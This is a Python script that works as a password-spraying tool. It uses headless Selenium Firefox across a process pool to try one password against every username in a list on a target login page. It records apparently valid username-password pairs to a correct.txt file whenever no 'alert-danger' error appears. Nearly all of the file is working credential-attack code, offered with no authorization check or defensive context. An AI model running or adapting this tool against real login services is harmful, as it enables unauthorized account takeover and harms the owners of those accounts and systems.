#!/usr/bin/env python3

from multiprocessing import Pool
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import argparse

parser = argparse.ArgumentParser(description='Password sprayer')
parser.add_argument('-f', '--file', help='List of usernames to spray')
parser.add_argument('-p', '--password', help='Single Password')
parser.add_argument('-t', '--threads', help='Threads to process')
parser.add_argument('-u', '--url', help='Url to spray')

args = parser.parse_args()

count = 0

print('-> Using list: ', args.file + '\r\n')
output = open("output.txt","a+")
output.write('-> Using list: ' + args.file + '\r\n')
output.close()
output = open("tried.txt","a+")
output.write(args.password + '\r\n')
output.close()

def try_login(username):
    global count
    count += 1
    print('Wave try: ' + str(count))
    try:
        # File Logging
        print(('-> Attempting: ' + username))
        output = open("output.txt","a+")
        output.write('-> Attempting: ' + username + ' - ' + args.password)
        output.close()

        # set options
        options = Options()
        options.headless = True
        driver = webdriver.Firefox(options=options)
        driver.set_window_size(1024, 768)

        try:
            driver.get(args.url)
            time.sleep(3)
            usernamefield = driver.find_element_by_name('username')
            # usernamefield = driver.find_element_by_xpath("//form[1]")
            usernamefield.send_keys(username)
            passwordfield = driver.find_element_by_name('password')
            passwordfield.send_keys(args.password, Keys.RETURN)
            # looking for id="trInvCrd"
            try:
                print('looking for message')
                errormsg = WebDriverWait(driver, 60).until(
                    EC.visibility_of_element_located((By.CLASS_NAME, "alert-danger"))
                )
                print('Invalid')
            except:
                print('Username: ' + username + ' correct')
                output = open("output.txt","a+")
                output.write('-> Potential correct user found: ' + username.rstrip() + '\r\n')
                output.close()
                output = open("correct.txt","a+")
                output.write('-> Potential correct user found: ' + username.rstrip() + ' pass - ' + args.password + '\r\n')
                output.close()

        except:
            print('could not get host')
            output = open("badrequest.txt","a+")
            output.write('-> bad: ' + username + '\r\n')
            output.close()

    except:
        print('big except')
        output = open("bigrequest.txt","a+")
        output.write('-> big: ' + username + '\r\n')
        output.close()
    finally:
        driver.close()

if __name__ == "__main__":
    pool = Pool(int(args.threads))
    with open(args.file, 'r') as source_file:
        # chunk the work into batches of 4 lines at a time
        print('attempt #: ' + str(count))
        pool.map(try_login, source_file, 1)
